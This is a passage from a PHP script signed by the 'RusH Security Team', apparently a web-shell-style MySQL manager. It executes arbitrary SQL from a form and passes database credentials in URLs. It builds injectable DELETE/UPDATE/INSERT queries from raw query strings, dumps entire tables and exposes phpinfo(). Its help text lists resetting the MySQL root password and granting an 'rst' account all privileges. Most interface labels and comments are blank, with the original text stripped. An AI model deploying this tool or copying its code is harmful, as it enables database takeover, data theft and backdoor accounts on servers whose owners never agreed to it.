        <input type=\"hidden\" name=\"server\" value=\"$server\">
        <input type=\"hidden\" name=\"port\" value=\"$port\">
        <input type=\"hidden\" name=\"login\" value=\"$login\">
        <input type=\"hidden\" name=\"passwd\" value=\"$passwd\">
        <table width=90% border=0 bgcolor=#EDEEF1><tr><td>     ( <b>$tbl</b> )</td></tr>
        <tr><td width=90>
        <textarea name=\"new_query_tbl\" rows=\"10\" cols=\"80\">$q_tbl</textarea>
        </td><td valign=top>
        <input type=\"checkbox\" name=\"php_kod\" value=\"ok\">  PHP- <br><br>
        <input type=\"checkbox\" name=\"return_sql\" value=\"ok\" checked=\"checked\">    <br>
        <br>
        <a href=\"$self?s=$s&q_help=ok\" tarGET=\"_blank\"><b> </b></a>
        </td></tr>
        <tr><td>
        <input type=\"submit\" value=\"\">
        </td></tr>
        </table></td></form>";


if (isset($HTTP_GET_VARS['query_tbl']) || $HTTP_GET_VARS['q_tbl']=='table') { 
  print $form_query_db_tbl."<br>"; 
}


if (isset($new_query_tbl)) {
   $new_query_tbl=trim($new_query_tbl);
   print $form_query_db_tbl;


   $result_tbl = mysql_query($new_query_tbl) or die("$h_error<b>".mysql_error()."</b>$f_error");
   if ($result_tbl !=='') {
      print " 
      <table align=center border=0 width=90% cellpadding=0 cellspacing=1 bgcolor=#FFFFFF><tr>";
      if ($php_kod=='ok') { print "<font color=green><b>PHP- :</b></font><br>\$sql = \"$new_query_tbl\";<br><br>"; }
      if (preg_match("[drop]",$new_query)) { print " ,    ."; }

      print "<br><b>  </b><br>";
      /*  */
      for ($i=0;$i<@mysql_num_fields($result_tbl);$i++){
           $name_tbl=mysql_field_name($result_tbl,$i);
           print "<td bgcolor=#C7C5C5>$name_tbl</td>";   
      } 

      print "</tr>";
      while ($line_tbl = @mysql_fetch_array($result_tbl, MYSQL_ASSOC)) {
         print "<tr>";
         foreach ($line_tbl as $key_tbl =>$col_value_tbl) {          
             print "<td bgcolor=#EDEEF1>".htmlspecialchars($col_value_tbl)."</td>";
         }
         print "</tr>";
      }
      print "</table><br>";
      @mysql_free_result($result_tbl);
   }
}

/*-------------  --------------*/
if (!isset($alter_table) && !isset($st_tab) && !isset($query_tbl) && !isset($new_query_tbl) && 
!isset($dump) && !isset($strukt) && !isset($query_edit) && !isset($query_del) && !isset($q_GET) && 
!isset($nn_row) && !isset($nn) && !isset($upd_f)) {
  print "<br><table border=0 cellpadding=1 cellspacing=1 width=100% bgcolor=#FFFFFF><tr>";

//   ,   ()    
//Key_name  , Column_name  
$query_ind = 'SHOW KEYS FROM '.$tbl;
$result_ind = mysql_query($query_ind) or die("$h_error<b>".mysql_error()."</b>$f_error");

while ($row = mysql_fetch_array($result_ind, MYSQL_ASSOC)) {
    if ($row['Key_name'] == 'PRIMARY') {
        $primary[] .= $row['Column_name'];
    } 
}
 
mysql_free_result($result_ind);

 $query = "SELECT * FROM $tbl LIMIT $limit_start,$limit_count";
 $result = mysql_query($query) or die("$h_error<b>".mysql_error()."</b>$f_error");
if (mysql_num_rows($result) == 0) {
  print " <b>$tbl</b>     ";
}else{
  /*  */
  print "<td bgcolor=#E6E7E9></td><td bgcolor=#E6E7E9></td>";
  for ($i=0;$i<mysql_num_fields($result);$i++){
    $name=mysql_field_name($result,$i);
    print "<td bgcolor=#C7C5C5>$name</td>";   
  } 
}
  while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {
     print "</tr>";

     foreach ($line as $key =>$col_value) {

         if (count($primary) > 0) { 
           if (in_array($key,$primary)) { $edit .= urlencode("`$key`='$col_value' AND "); } 
         } 
         else {
            //if (strlen($col_value) >= 20) { 
            //   $e_count=substr($col_value,0,20);
            //   $edit .= urlencode("`$key`='$e_count' AND ");
            //} else {
               $edit .= urlencode("`$key`='$col_value' AND ");
            //}
            
         } 

        $string .= "<td bgcolor=#EDEEF1>".htmlspecialchars($col_value)."</td>";
     }
       $edit=substr_replace($edit,"",-5); //  +AND+
       print "<tr><td bgcolor=#97C8D4 width=25><a href=$self?query_edit=$edit&s=y&login=$login&passwd=$passwd&server=$server&port=$port&db=$db&tbl=$tbl title=\"  \">Edit</a></td>".
             "<td bgcolor=#F84C6C width=25><a href=$self?query_del=$edit&s=y&login=$login&passwd=$passwd&server=$server&port=$port&db=$db&tbl=$tbl title=\" \" onClick=\"return confirm(' ,  ?')\";>Del</a></td>".
             $string."</tr>";
    
       unset($edit);
       unset($string);
  }

  mysql_free_result($result);
  print "</table><br>";
}

// 
if (isset($query_del)) {
 $query = 'DELETE FROM '.$tbl.' WHERE '.urldecode($query_del);
 $r_del = mysql_query($query) or die("$h_error<b>".mysql_error()."</b>$f_error");
 print "   (<b> ".mysql_affected_rows()."</b> )";

}

//   
if (isset($query_edit)) {
 $query = 'SELECT * FROM '.$tbl.' WHERE '.urldecode($query_edit);
 $r_edit = mysql_query($query) or die("$h_error<b>".mysql_error()."</b>$f_error"); 


print "<br><center><font color=green><h5>   </h5></font></center>".
      "<table border=0 cellpadding=1 cellspacing=1 bgcolor=#FFFFFF><tr bgcolor=#C7C5C5>".
      "<td align=center><b></b></td><td align=center><b></b></td></tr>";
print   "<form method=\"GET\" action=\"$self\">".
        "<input type=\"hidden\" name=\"s\" value=\"$s\">".
        "<input type=\"hidden\" name=\"q_GET\" value=\"y\">".
        "<input type=\"hidden\" name=\"server\" value=\"$server\">".
        "<input type=\"hidden\" name=\"port\" value=\"$port\">".
        "<input type=\"hidden\" name=\"login\" value=\"$login\">".
        "<input type=\"hidden\" name=\"passwd\" value=\"$passwd\">".
        "<input type=\"hidden\" name=\"db\" value=\"$db\">".
        "<input type=\"hidden\" name=\"tbl\" value=\"$tbl\">";
     print "<input type=\"radio\" name=\"up_str\" value=\"up_ok\" checked=\"checked\"> &nbsp;&nbsp;<b></b>&nbsp;&nbsp;&nbsp;".
           "<input type=\"radio\" name=\"up_str\" value=\"ins_ok\">  <br><br>";

  while ($line = mysql_fetch_array($r_edit, MYSQL_ASSOC)) {
     foreach ($line as $key =>$col_value) {
        $del_str_ .= "`$key`='$col_value' AND ";
        $len_value=strlen($col_value);
        if ($len_value > 40) { $t_value="<textarea name=$key cols=39 rows=5>$col_value</textarea>"; }
        else { $t_value="<input type='text' name='$key' value='$col_value'size=40>"; }
        $g_query .= "<tr><td bgcolor=#DBDCDD><b>$key</b></td><td>$t_value</td></tr>";
     }
  }
     $del_str=urlencode($del_str_);
     print "<input type=\"hidden\" name=\"del_str\" value=\"$del_str\">";
     print "$g_query</table><br>";
     print "<br><input type=submit value=\" \"></form>";
}

if (isset($q_GET)) {
  $url=$HTTP_SERVER_VARS['QUERY_STRING'];
  if ($HTTP_GET_VARS['up_str']=='up_ok') {
     $del_str=urldecode(substr_replace($del_str,"",-5));
     $b = explode('&', $url);
     for ($i = 10; $i < count($b); $i++) {
        $q = explode("=",$b[$i]);
        $q_a .= "`".$q[0]."`='".$q[1]."', ";
     }
     $q_a_ins=urldecode(substr_replace($q_a,"",-2));
     $q_st=urldecode(substr_replace($q_st,"",-2));
     //  $del_str 
     //    $q_a_ins

     $up="UPDATE `$tbl` SET $q_a_ins WHERE $del_str LIMIT 1";
     $q_ins_new = mysql_query($up) or die("$h_error<b>".mysql_error()."</b>$f_error");
     $c_a_r=mysql_affected_rows();
     print "<table align=left width=70% bgcolor=#D7D8DA><tr><td><font color=green>".
           "<b>PHP- :</b></font></td></tr><tr><td>\$sql=\"$up\";</td>".
           "</tr><tr><td><font color=green> </font> (<b>$c_a_r<b>)</td></tr></table>";
  }
  if ($HTTP_GET_VARS['up_str']=='ins_ok') {
     $b = explode('&', $url);
     for ($i = 10; $i < count($b); $i++) {
        $q = explode("=",$b[$i]);
        $i_cols .="`$q[0]`, ";
        $i_val .= "'$q[1]', ";
     }
     $i_cols=urldecode(substr_replace($i_cols,"",-2)); //
     $q_a_ins=urldecode(substr_replace($i_val,"",-2)); //
     $up="INSERT INTO `$tbl` ($i_cols) VALUES ($q_a_ins)";
     $q_ins_new = mysql_query($up) or die("$h_error<b>".mysql_error()."</b>$f_error");
     $c_a_r=mysql_affected_rows();
     print "<table align=left width=70% bgcolor=#D7D8DA><tr><td><font color=green>".
           "<b>PHP- :</b></font></td></tr><tr><td>\$sql=\"$up\";</td>".
           "</tr><tr><td><font color=green> </font> (<b>$c_a_r<b>)</td></tr></table>";
    
  }
}

/*------------ --------------*/
if (isset($nn_row) && $HTTP_GET_VARS['nn_row']=='ok') {
 $nn_q = 'SHOW FIELDS FROM '.$tbl;
 $r_n = mysql_query($nn_q) or die("$h_error<b>".mysql_error()."</b>$f_error");
print   "<form method=\"GET\" action=\"$self\">".
        "<input type=\"hidden\" name=\"s\" value=\"$s\">".
        "<input type=\"hidden\" name=\"nn\" value=\"ok\">".
        "<input type=\"hidden\" name=\"server\" value=\"$server\">".
        "<input type=\"hidden\" name=\"port\" value=\"$port\">".
        "<input type=\"hidden\" name=\"login\" value=\"$login\">".
        "<input type=\"hidden\" name=\"passwd\" value=\"$passwd\">".
        "<input type=\"hidden\" name=\"db\" value=\"$db\">".
        "<input type=\"hidden\" name=\"tbl\" value=\"$tbl\">".
        "<br><center><font size=2>     [ <b>$tbl</b> ]</font></center>".        
        "<br><table border=0 cellpadding=0 cellspacing=1 bgcolor=#FFFFFF><tr bgcolor=#DAD9D9>".
        "<td align=center><b></b></td><td align=center><b></b></td>".
        "<td align=center><b></b></td></tr>";
  while ($n_line = mysql_fetch_array($r_n, MYSQL_ASSOC)) {
     foreach ($n_line as $n_k =>$n_v) {
        $pole .= "$n_v ";
     }
       $n_l=explode(" ",$pole);
       print "<tr bgcolor=#EDEEF1><td>&nbsp;<b>$n_l[0]</b>&nbsp;</td><td bgcolor=#E7E7D7>&nbsp;".
              wordwrap($n_l[1],40,"<br>",1).
              "&nbsp;</td><td><input type=text name=\"$n_l[0]\" size=35><td></tr>";             
       unset($pole); 
  }
  print "</table><br><center><input type=submit value=\"  \"></center></form><br>";
}

if (isset($nn) && $HTTP_GET_VARS['nn']=='ok') {
     $url_n=urldecode($HTTP_SERVER_VARS['QUERY_STRING']);
     $b_nn = explode('&', $url_n);
     for ($i = 8; $i < count($b_nn); $i++) {
        $q_nn = explode("=",$b_nn[$i]);
          $q_a_nn .= "`".$q_nn[0]."` ,";        
          $q_nn_v .= "'".$q_nn[1]."' ,";
     }

     $q_nn_ins=urldecode(substr_replace($q_a_nn,"",-2));
     $q_nn_v=substr_replace($q_nn_v,"",-2);
     $sql_n="INSERT INTO `$tbl` ( $q_nn_ins ) VALUES ( $q_nn_v )";
     mysql_query($sql_n) or die("$h_error<b>".mysql_error()."</b>$f_error");
     $c_n_r=mysql_affected_rows();
     print "&nbsp;&nbsp;&nbsp;<table align=left width=70% bgcolor=#D7D8DA>".
           "<tr><td><b>Action:</b> <font color=green>  </font> (<b>$c_n_r<b>)</td></tr>".
           "<tr><td><font color=green><b>PHP- :</b></font></td></tr><tr><td>\$sql=\"$sql_n\";</td></tr></table><br><br>";
}

/*-----------dump ------------*/
$form_dump=
"<form method=\"GET\" action=\"$self\">".
"<input type=\"hidden\" name=\"s\" value=\"$s\">".
"<input type=\"hidden\" name=\"db\" value=\"$db\">".
"<input type=\"hidden\" name=\"tbl\" value=\"$tbl\">".
"<input type=\"hidden\" name=\"server\" value=\"$server\">".
"<input type=\"hidden\" name=\"port\" value=\"$port\">".
"<input type=\"hidden\" name=\"login\" value=\"$login\">".
"<input type=\"hidden\" name=\"passwd\" value=\"$passwd\">".
"<input type=\"hidden\" name=\"f_dump\" value=\"$file\">".
"<table bgcolor=#FFFFFF width=400 cellpadding=0 cellspacing=1 border=0><tr bgcolor=#F0F1F4><td valign=top>".
"<table cellpadding=2 bgcolor=#F0F1F4 width=100%>".
"<tr><td align=center><b>Dump </b> [ <font color=green><b>$tbl</b></font> ]</td></tr>".
"<tr><td><input type=\"radio\" name=\"strukt\" value=\"t_strukt\">  </td></tr>".
"<tr><td><input type=\"radio\" name=\"strukt\" value=\"d\">  </td></tr>".
"<tr><td><input type=\"radio\" name=\"strukt\" value=\"d_strukt\" checked=\"checked\">   </td></tr>".
"<tr><td align=center><hr size=1 color=#FFFFFF><b></b> (/)</td></tr>".
"<tr><td><input type=\"radio\" name=\"send\" value=\"send_br\" checked=\"checked\">   </td></tr>".
"<tr><td><input type=\"radio\" name=\"send\" value=\"send_http\">     HTTP</td></tr>".
"<tr><td align=center><br><input type=\"submit\" value=\" \"></td></tr>".
"</table>".
"</td></tr></table></form>";

if ($dump=="tab"){ print $form_dump;}
/*---------- ------------*/

if ($HTTP_GET_VARS['strukt']=='t_strukt' && $HTTP_GET_VARS['send']=='send_br' ){
   $host = $HTTP_SERVER_VARS["SERVER_NAME"];
   $ip = $HTTP_SERVER_VARS["SERVER_ADDR"];

   mysql_select_db($db) or die("$h_error<b>".mysql_error()."</b>$f_error");
   //$file = "/tmp/dump_".$tbl.".sql";
   //      
   $fp = fopen($file, "w"); 
   fputs ($fp, "# RST MySQL tools\r\n# Home page: http://rst.void.ru\r\n#\n# Host settings:\n# $host ($ip)\n# MySQL version: (".mysql_GET_server_info().")\n# Date: ".
   date("F j, Y, g:i a")."\n# "." dump db \"".$db."\" table \"".$tbl."\"\n#_________________________________________________________\n\n"); 

      //       
      $res = mysql_query("SHOW CREATE TABLE `".$tbl."`", $connection) or die("$h_error<b>".mysql_error()."</b>$f_error"); 
      $row = mysql_fetch_row($res); 
      fputs($fp, "DROP TABLE IF EXISTS `".$tbl."`;\n");
      fputs($fp, $row[1].";\n\n");   
   fclose($fp); 
   $dump_file=file($file);
print "<br><table bgcolor=#FFFFFF width=99% cellpadding=0 cellspacing=1 border=1><tr><td><table width=100% cellpadding=2 bgcolor=#F0F1F4>";
foreach ($dump_file as $k=>$v){$v=str_replace("\n","<br>",$v);print "<tr><td>".strip_tags($v,"<br>")."</td></tr>";}
print "</table></td></tr></table><br>";

unlink($file);
}

/*----------  ------------*/
if ($HTTP_GET_VARS['strukt']=='d_strukt' && $HTTP_GET_VARS['send']=='send_br'){
   $host = $HTTP_SERVER_VARS["SERVER_NAME"];
   $ip = $HTTP_SERVER_VARS["SERVER_ADDR"];

   mysql_select_db($db) or die("$h_error<b>".mysql_error()."</b>$f_error");
   //$file = "/tmp/dump_".$tbl.".sql";
   //      
   $fp = fopen($file, "w"); 
   fputs ($fp, "# RST MySQL tools\r\n# Home page: http://rst.void.ru\r\n#\n# Host settings:\n# $host ($ip)\n # MySQL version: (".mysql_GET_server_info().")\n# Date: ".
   date("F j, Y, g:i a")."\n# "." dump db \"".$db."\" table \"".$tbl."\"\n#_________________________________________________________\n\n"); 

      //       
      $res = mysql_query("SHOW CREATE TABLE `".$tbl."`", $connection) or die("$h_error<b>".mysql_error()."</b>$f_error"); 
      $row = mysql_fetch_row($res); 
      fputs($fp, "DROP TABLE IF EXISTS `".$tbl."`;\n");
      fputs($fp, $row[1].";\n\n"); 
       
      //    
      $res = mysql_query("SELECT * FROM `$tbl`", $connection); 
      if (mysql_num_rows($res) > 0) { 
         while ($row = mysql_fetch_assoc($res)) { 
            $keys = implode("`, `", array_keys($row)); 
            $values = array_values($row); 
            foreach($values as $k=>$v) {$values[$k] = addslashes($v);} 
            $values = implode("', '", $values); 
            $sql = "INSERT INTO `$tbl`(`".$keys."`) VALUES ('".$values."');\n"; 
            fputs($fp, $sql); 
         } 
      }
 
   fclose($fp); 
$dump_file=file($file);
print "<br><table bgcolor=#FFFFFF width=99% cellpadding=0 cellspacing=1 border=1><tr><td><table width=100% cellpadding=2 bgcolor=#F0F1F4>";
foreach ($dump_file as $k=>$v){$v=str_replace("\n","<br>",$v);print "<tr><td>".strip_tags($v,"<br>")."</td></tr>";}
print "</table></td></tr></table><br>";
unlink($file);
}

/*---------- ------------*/
if ($HTTP_GET_VARS['strukt']=='d' && $HTTP_GET_VARS['send']=='send_br'){
   $host = $HTTP_SERVER_VARS["SERVER_NAME"];
   $ip = $HTTP_SERVER_VARS["SERVER_ADDR"];

   mysql_select_db($db) or die("$h_error<b>".mysql_error()."</b>$f_error");
   //$file = "/tmp/dump_".$tbl.".sql";
   //      
   $fp = fopen($file, "w"); 
      //    
      $res = mysql_query("SELECT * FROM `$tbl`", $connection); 
      if (mysql_num_rows($res) > 0) { 
         while ($row = mysql_fetch_assoc($res)) { 
            $keys = implode("`, `", array_keys($row)); 
            $values = array_values($row); 
            foreach($values as $k=>$v) {$values[$k] = addslashes($v);} 
            $values = implode("', '", $values); 
            $sql = "INSERT INTO `$tbl`(`".$keys."`) VALUES ('".$values."');\n"; 
            fputs($fp, $sql); 
         } 
      }
 
   fclose($fp); 
$dump_file=file($file);
print "<br><table bgcolor=#FFFFFF width=99% cellpadding=0 cellspacing=1 border=1><tr><td><table width=100% cellpadding=2 bgcolor=#F0F1F4>";
foreach ($dump_file as $k=>$v){$v=str_replace("\n","<br>",$v);print "<tr><td>".strip_tags($v,"<br>")."</td></tr>";}
print "</table></td></tr></table><br>";
unlink($file);
}
/*-------------END!   --------------*/

print "
   </td>
 </tr>
</table>
           </td>
         </tr>
       </table>";
}

/*------------------------ END R I G H T   B L O C K ! -----------------------*/
/* php*/
if (isset($php) && $php=='ok'){
phpinfo();
}
if (isset($q_help) && $q_help=='ok'){
 print ' HELP  
 <li><b>SHOW TABLES </b>    
 <li><b>SHOW OPEN TABLES</b>   ,        
 <li><b>SHOW TABLE STATUS</b>   
 <li><b>SELECT VERSION(), CURRENT_DATE</b>   MySQL    
 <li><b>SELECT (2*2), (4+1)*5, (9/3), (5-3)</b>  MySQL  :     
 <li><b>DROP TABLE IF EXISTS table_name</b>   \"table_name\"
 <li><b>CREATE TABLE bar (m INT)</b>   bar    (m)  integer
 <li><b>CREATE TABLE test (number INTEGER,texts CHAR(10));</b>   test   number - INTEGER   texts - CHAR
 <li><b>CREATE TABLE `test` SELECT * FROM `rush`;</b>   test ,  rush
 <li><b>ALTER TABLE test CHANGE SITE OLD_SITE INTEGER</b>   INTEGER  SITE  OLD_SITE
 <li><b>ALTER TABLE test RENAME rush</b>   test  rush
 <li><b>UPDATE mysql.user SET Password=PASSWORD(\'new_passwd\') WHERE user=\'root\'</b>   root 
 <li><b>FLUSH PRIVILEGES</b>    
 <li><b>GRANT ALL PRIVILEGES ON *.* TO rst@localhost IDENTIFIED BY \'some_pass\' WITH GRANT OPTION</b>   - mysql <b>rst</b>   <b>some_pass</b>
 ';

}

print "
   </td>
 </tr>
</table>

</td></tr>
<tr><td>
<table align=center width=100% cellpadding=0 cellspacing=1 bgcolor=#000000>
<tr><td>
      <table background=".$self."?img=bg_f align=center border=0 width=100% cellpadding=0 cellspacing=0 bgcolor=#C2C2C2>
         <tr>
            <td align=center>
                free script &copy;RusH Security Team 
            </td>
         </tr>
      </table> 
</td></tr>
</table>
</td></tr></table>";

?>
